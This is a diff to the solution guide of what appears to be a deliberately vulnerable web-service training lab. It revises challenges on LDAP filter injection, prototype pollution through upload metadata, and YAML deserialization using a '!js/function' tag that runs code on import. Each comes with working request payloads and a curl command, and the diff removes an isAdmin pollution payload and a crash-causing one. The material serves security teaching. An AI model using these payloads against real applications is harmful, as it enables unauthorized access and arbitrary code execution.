@@ -374,7 +374,7 @@ The response reports the credited amount and new balance. `GET /api/v2/resource-
 
 **Endpoint:** `GET /api/v2/users/ldap-search?user=<input>` or `POST /api/v2/users/ldap-search`
 
-**Description:** The `user` parameter is concatenated directly into an LDAP filter string `(uid=<input>)` without sanitization.
+**Description:** The `user` parameter is concatenated directly into an LDAP filter string `(uid=<input>)` without sanitization. The directory adapter evaluates that filter against the same Mongo-backed account records used by login.
 
 ### Challenge
 
@@ -388,7 +388,7 @@ GET /api/v2/users/ldap-search?user=* HTTP/1.1
 Host: dvws.local
 ```
 
-Returns: `["admin", "guest", "manager"]`
+Returns matching account records from the application, including usernames, configured email/address fields, and permissions derived from each account's role.
 
 **Attribute injection to extract sensitive data:**
 ```
@@ -396,7 +396,7 @@ GET /api/v2/users/ldap-search?user=admin)(objectClass=*) HTTP/1.1
 Host: dvws.local
 ```
 
-The filter becomes `(uid=admin)(objectClass=*)` which triggers verbose output including email, GUID, description, and password fields.
+The filter becomes `(uid=admin)(objectClass=*)`. The injected second clause is evaluated as part of the directory search and returns the real admin account record and its `user:admin` permission. Passwords are not returned by this endpoint.
 
 ---
 
@@ -991,7 +991,7 @@ The `User` GraphQL type exposes the `password` field containing the bcrypt hash.
 
 ### Challenge
 
-Pollute `Object.prototype` to affect all objects in the application.
+Use a prototype-polluted upload metadata object to alter the upload handler's ordinary extension policy and upload an HTML file, which the default `.xml` policy rejects.
 
 ### Solution
 
@@ -1004,23 +1004,16 @@ Content-Type: multipart/form-data; boundary=----Boundary
 ------Boundary
 Content-Disposition: form-data; name="metadata"
 
-{"__proto__": {"isAdmin": true}}
+{"__proto__": {"allowedExtension": ".html"}}
 ------Boundary
-Content-Disposition: form-data; name="file"; filename="test.xml"
-Content-Type: text/xml
+Content-Disposition: form-data; name="file"; filename="test.html"
+Content-Type: text/html
 
-<test/>
+<h1>uploaded through the polluted extension policy</h1>
 ------Boundary--
 ```
 
-After this request, every new object in the application inherits `isAdmin: true` from `Object.prototype`.
-
-A more destructive payload:
-```json
-{"__proto__": {"toString": "POLLUTED"}}
-```
-
-This overwrites `Object.prototype.toString`, causing `TypeError` crashes across the application (DoS).
+The recursive merge writes `allowedExtension` onto `Object.prototype`. The upload handler reads that inherited property when selecting its allowed extension, accepts the HTML file, and saves it in the authenticated user's upload directory. The inherited setting affects later requests in that server process until a subsequent metadata merge sets it to `null`, which removes the property.
 
 ---
 
@@ -1570,7 +1563,9 @@ Create `orders.yaml`:
 supplier: Northstar Components
 orders:
   - sku: BRG-104
+    itemName: Bearing assembly
     quantity: 12
+    unitPrice: 4.5
 postImport: !js/function "require('fs').writeFileSync('/tmp/dvws-yaml-import-marker', 'executed')"
 ```
 
@@ -1582,7 +1577,7 @@ curl -X POST http://dvws.local/api/v2/integrations/supplier-orders/import \
   -F 'file=@orders.yaml;type=text/yaml'
 ```
 
-The response reports one imported order, and `/tmp/dvws-yaml-import-marker` contains `executed`. The function tag is deserialized and invoked as part of processing the batch.
+The response reports one imported order with its item details. The order is persisted under the authenticated account and appears in `GET /api/v2/resource-store` order history. `/tmp/dvws-yaml-import-marker` contains `executed`, proving that the function tag was deserialized and invoked during the same import.
 
 The example is non-destructive, but the vulnerable parser can execute arbitrary JavaScript; the marker path does not sandbox it. Run this challenge only in an isolated lab.
 
